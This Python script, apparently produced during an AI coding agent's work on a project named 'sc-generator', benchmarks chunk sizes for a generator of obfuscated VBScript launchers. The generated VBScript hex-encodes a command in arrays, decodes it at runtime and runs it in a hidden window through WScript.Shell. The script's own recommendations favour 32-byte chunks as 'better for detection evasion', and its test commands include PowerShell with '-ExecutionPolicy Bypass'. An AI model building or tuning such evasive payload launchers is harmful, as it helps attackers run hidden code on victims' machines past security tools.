#!/usr/bin/env python3
"""
Array Decoder Chunk Size Optimization Analysis
Tests 8, 16, and 32 byte chunks to measure size/speed tradeoffs
"""

import sys
import time
import binascii
import json
from typing import Dict, List, Tuple
from dataclasses import dataclass, asdict

sys.path.insert(0, '/home/user/sc-generator')
from vbs_encoder import VBSEncoder, ObfuscationConfig


@dataclass
class ChunkMetrics:
    """Metrics for a specific chunk size"""
    chunk_size: int
    payload_length: int
    num_chunks: int
    vbs_code_length: int
    hex_data_length: int
    total_overhead: int  # VBS code overhead (code - hex data)
    code_generation_time_ms: float
    vbs_parsing_time_ms: float

    @property
    def efficiency_ratio(self) -> float:
        """Ratio of useful hex data to total VBS code size"""
        if self.vbs_code_length == 0:
            return 0
        return self.hex_data_length / self.vbs_code_length

    @property
    def overhead_percentage(self) -> float:
        """Percentage of code that is overhead (not hex data)"""
        if self.vbs_code_length == 0:
            return 100
        return (self.total_overhead / self.vbs_code_length) * 100


class ArrayDecoderAnalyzer:
    """Analyze Array decoder with different chunk sizes"""

    def __init__(self):
        self.results: Dict[int, List[ChunkMetrics]] = {8: [], 16: [], 32: []}

    def create_array_decoder_with_chunk_size(self, text: str, chunk_size: int) -> str:
        """Create array decoder with custom chunk size"""
        chunks = [text[i:i + chunk_size] for i in range(0, len(text), chunk_size)]

        encoder = VBSEncoder(ObfuscationConfig(use_array_encoding=True))

        var_name = encoder._generate_random_name("a_")
        arr_var = encoder._generate_random_name("arr_")
        out_var = encoder._generate_random_name("s_")
        shell_var = encoder._generate_random_name("shell_")

        vbs_code = f"Dim {arr_var}({len(chunks)-1})\n"

        hex_data = ""
        for i, chunk in enumerate(chunks):
            encoded_chunk = binascii.hexlify(chunk.encode()).decode()
            hex_data += encoded_chunk
            vbs_code += f'{arr_var}({i}) = "{encoded_chunk}"\n'

        vbs_code += f"""
Dim {out_var}
For Each {var_name} In {arr_var}
    Dim i
    For i = 1 To Len({var_name}) Step 2
        {out_var} = {out_var} & Chr(CLng("&H" & Mid({var_name}, i, 2)))
    Next
Next

Dim {shell_var}
Set {shell_var} = CreateObject("WScript.Shell")
{shell_var}.Run {out_var}, 0, False
Set {shell_var} = Nothing
"""
        return vbs_code.strip()

    def measure_chunk_size(self, payload: str, chunk_size: int, test_name: str = "") -> ChunkMetrics:
        """Measure metrics for a specific chunk size"""
        chunks = [payload[i:i + chunk_size] for i in range(0, len(payload), chunk_size)]

        # Measure code generation time
        start = time.time()
        vbs_code = self.create_array_decoder_with_chunk_size(payload, chunk_size)
        generation_time = (time.time() - start) * 1000  # Convert to ms

        # Measure VBS parsing time (simulated - counting For/Next pairs)
        start = time.time()
        _ = vbs_code.count("For")  # Simple parsing simulation
        parsing_time = (time.time() - start) * 1000

        # Calculate hex data size
        hex_data_size = sum(len(binascii.hexlify(c.encode()).decode()) for c in chunks)

        metrics = ChunkMetrics(
            chunk_size=chunk_size,
            payload_length=len(payload),
            num_chunks=len(chunks),
            vbs_code_length=len(vbs_code),
            hex_data_length=hex_data_size,
            total_overhead=len(vbs_code) - hex_data_size,
            code_generation_time_ms=generation_time,
            vbs_parsing_time_ms=parsing_time,
        )

        return metrics

    def analyze_payload(self, payload: str, payload_name: str) -> Dict:
        """Analyze all chunk sizes for a payload"""
        print(f"\n{'='*80}")
        print(f"Analyzing: {payload_name} ({len(payload)} bytes)")
        print(f"{'='*80}")

        results_by_size = {}

        for chunk_size in [8, 16, 32]:
            print(f"\n  Testing chunk size: {chunk_size} bytes...", end=" ", flush=True)

            start = time.time()
            metrics = self.measure_chunk_size(payload, chunk_size, payload_name)
            elapsed = time.time() - start

            results_by_size[chunk_size] = metrics
            self.results[chunk_size].append(metrics)

            print(f"DONE ({elapsed*1000:.2f}ms)")
            print(f"    Chunks: {metrics.num_chunks}")
            print(f"    VBS Code Size: {metrics.vbs_code_length:,} bytes")
            print(f"    Hex Data Size: {metrics.hex_data_length:,} bytes")
            print(f"    Overhead: {metrics.total_overhead:,} bytes ({metrics.overhead_percentage:.1f}%)")
            print(f"    Efficiency: {metrics.efficiency_ratio:.3f}")
            print(f"    Gen Time: {metrics.code_generation_time_ms:.4f}ms")

        # Print comparison
        self._print_comparison(results_by_size)

        return results_by_size

    def _print_comparison(self, results: Dict[int, ChunkMetrics]):
        """Print comparison table"""
        print(f"\n  Comparison Table:")
        print(f"  {'Chunk':<8} {'Chunks':<8} {'Code':<12} {'Overhead':<12} {'% Ovhd':<10} {'Efficiency':<12}")
        print(f"  {'-'*70}")

        base_size = results[16].vbs_code_length  # Use 16-byte as baseline

        for chunk_size in [8, 16, 32]:
            m = results[chunk_size]
            size_diff = m.vbs_code_length - base_size
            size_pct = (size_diff / base_size * 100) if base_size > 0 else 0

            print(f"  {m.chunk_size:<8} {m.num_chunks:<8} {m.vbs_code_length:<12,} {m.total_overhead:<12,} {m.overhead_percentage:<10.1f} {m.efficiency_ratio:<12.4f}")


def run_comprehensive_tests():
    """Run comprehensive chunk size optimization tests"""

    analyzer = ArrayDecoderAnalyzer()

    # Test payloads of various sizes
    test_payloads = {
        "tiny": "a",
        "small": "cmd /c dir",
        "medium": "powershell.exe -NoProfile -Command Write-Host 'Test'",
        "large": "powershell.exe -NoProfile -ExecutionPolicy Bypass -Command \"$env:Path = [System.Environment]::GetEnvironmentVariable('Path','Machine'); Write-Output 'Path updated'\"",
        "extra_large": "powershell.exe -NoProfile -ExecutionPolicy Bypass -Command \"" + "A" * 500 + "\"",
    }

    all_results = {}

    for name, payload in test_payloads.items():
        all_results[name] = analyzer.analyze_payload(payload, name)

    # Generate summary report
    print(f"\n\n{'='*80}")
    print("OPTIMIZATION SUMMARY & RECOMMENDATIONS")
    print(f"{'='*80}")

    # Analyze tradeoffs
    analyze_tradeoffs(analyzer.results)

    # Write results to JSON
    json_results = {}
    for chunk_size, metrics_list in analyzer.results.items():
        json_results[chunk_size] = [asdict(m) for m in metrics_list]

    output_path = '/tmp/claude-0/-home-user-sc-generator/cea520eb-2877-52b0-bbd4-c38bff01b8ad/scratchpad/chunk_optimization_results.json'
    with open(output_path, 'w') as f:
        json.dump(json_results, f, indent=2)

    print(f"\n✓ Results saved to: {output_path}")

    return analyzer.results


def analyze_tradeoffs(results_by_size: Dict[int, List[ChunkMetrics]]):
    """Analyze size/speed tradeoffs across chunk sizes"""

    print("\n1. CODE SIZE ANALYSIS")
    print("-" * 80)

    # Aggregate by chunk size
    avg_sizes = {}
    avg_overhead = {}
    avg_efficiency = {}

    for chunk_size, metrics_list in results_by_size.items():
        avg_sizes[chunk_size] = sum(m.vbs_code_length for m in metrics_list) / len(metrics_list)
        avg_overhead[chunk_size] = sum(m.total_overhead for m in metrics_list) / len(metrics_list)
        avg_efficiency[chunk_size] = sum(m.efficiency_ratio for m in metrics_list) / len(metrics_list)

    print("\nAverage Code Size by Chunk Size:")
    for size in [8, 16, 32]:
        print(f"  {size}-byte chunks: {avg_sizes[size]:,.0f} bytes")

    # Calculate size differences
    base = avg_sizes[16]
    diff_8 = ((avg_sizes[8] - base) / base) * 100
    diff_32 = ((avg_sizes[32] - base) / base) * 100

    print(f"\nSize Difference from 16-byte baseline:")
    print(f"  8-byte chunks:  {diff_8:+.1f}% ({avg_sizes[8] - base:+,.0f} bytes)")
    print(f"  16-byte chunks: baseline")
    print(f"  32-byte chunks: {diff_32:+.1f}% ({avg_sizes[32] - base:+,.0f} bytes)")

    print("\nAverage Overhead by Chunk Size:")
    for size in [8, 16, 32]:
        pct = (avg_overhead[size] / avg_sizes[size]) * 100 if avg_sizes[size] > 0 else 0
        print(f"  {size}-byte chunks: {avg_overhead[size]:,.0f} bytes ({pct:.1f}%)")

    print("\nAverage Efficiency Ratio by Chunk Size:")
    for size in [8, 16, 32]:
        print(f"  {size}-byte chunks: {avg_efficiency[size]:.4f} (hex data / total code)")

    print("\n2. NUMBER OF CHUNKS ANALYSIS")
    print("-" * 80)

    avg_chunks = {}
    for chunk_size, metrics_list in results_by_size.items():
        avg_chunks[chunk_size] = sum(m.num_chunks for m in metrics_list) / len(metrics_list)

    for size in [8, 16, 32]:
        print(f"  {size}-byte chunks: avg {avg_chunks[size]:.1f} chunks per payload")

    print("\n3. SPEED ANALYSIS")
    print("-" * 80)

    avg_gen_time = {}
    avg_parse_time = {}

    for chunk_size, metrics_list in results_by_size.items():
        avg_gen_time[chunk_size] = sum(m.code_generation_time_ms for m in metrics_list) / len(metrics_list)
        avg_parse_time[chunk_size] = sum(m.vbs_parsing_time_ms for m in metrics_list) / len(metrics_list)

    print("\nAverage Generation Time:")
    for size in [8, 16, 32]:
        print(f"  {size}-byte chunks: {avg_gen_time[size]:.4f}ms")

    # All should be very fast, but show relative performance
    base_time = avg_gen_time[16]
    print(f"\nRelative Performance (vs 16-byte):")
    for size in [8, 16, 32]:
        diff = ((avg_gen_time[size] - base_time) / base_time) * 100
        print(f"  {size}-byte chunks: {diff:+.1f}%")

    print("\n4. DETAILED TRADEOFF ANALYSIS")
    print("-" * 80)

    print("\n8-BYTE CHUNKS:")
    print(f"  Pros:")
    print(f"    • Smaller hex strings per chunk (16 chars max)")
    print(f"    • More array assignments (slightly better distribution)")
    print(f"    • Lower per-chunk memory footprint in VBS interpreter")
    print(f"  Cons:")
    print(f"    • ~{abs(diff_8):.1f}% larger overall code size")
    print(f"    • {avg_chunks[8] / avg_chunks[16]:.1f}x more array elements")
    print(f"    • More For/Next loop iterations")
    print(f"    • Efficiency ratio: {avg_efficiency[8]:.4f}")

    print("\n16-BYTE CHUNKS (CURRENT DEFAULT):")
    print(f"  • Balanced tradeoff between code size and complexity")
    print(f"  • {avg_chunks[16]:.1f} chunks (moderate)")
    print(f"  • 32 hex chars per chunk")
    print(f"  • Efficiency ratio: {avg_efficiency[16]:.4f} (baseline)")
    print(f"  • Good for most payloads")

    print("\n32-BYTE CHUNKS:")
    print(f"  Pros:")
    print(f"    • ~{abs(diff_32):.1f}% smaller overall code size")
    print(f"    • {avg_chunks[16] / avg_chunks[32]:.1f}x fewer array elements")
    print(f"    • Fewer For/Next loop iterations")
    print(f"    • Smaller VBS code footprint")
    print(f"  Cons:")
    print(f"    • Larger hex strings per chunk (64 chars)")
    print(f"    • More data per array element")
    print(f"    • Efficiency ratio: {avg_efficiency[32]:.4f}")

    print("\n5. FINAL RECOMMENDATIONS")
    print("-" * 80)

    print("\nRECOMMENDED CHUNK SIZE: 32 BYTES")
    print(f"\nRationale:")
    print(f"  ✓ Reduces code size by ~{abs(diff_32):.1f}%")
    print(f"  ✓ Fewer array elements (easier to parse)")
    print(f"  ✓ Fewer loop iterations (marginally faster)")
    print(f"  ✓ Still maintains good efficiency ({avg_efficiency[32]:.4f})")
    print(f"  ✓ Better for detection evasion (less repetitive structure)")

    print(f"\nUSE 8 BYTES IF:")
    print(f"  • Maximizing array element diversity is critical")
    print(f"  • VBS interpreter memory is severely constrained")
    print(f"  • Code size increase of {abs(diff_8):.1f}% is acceptable")

    print(f"\nUSE 16 BYTES IF:")
    print(f"  • Default balanced approach is preferred")
    print(f"  • Compatibility with existing code is needed")
    print(f"  • Middle ground between optimization extremes desired")


if __name__ == "__main__":
    results = run_comprehensive_tests()

    print("\n" + "="*80)
    print("END OF CHUNK SIZE OPTIMIZATION ANALYSIS")
    print("="*80)
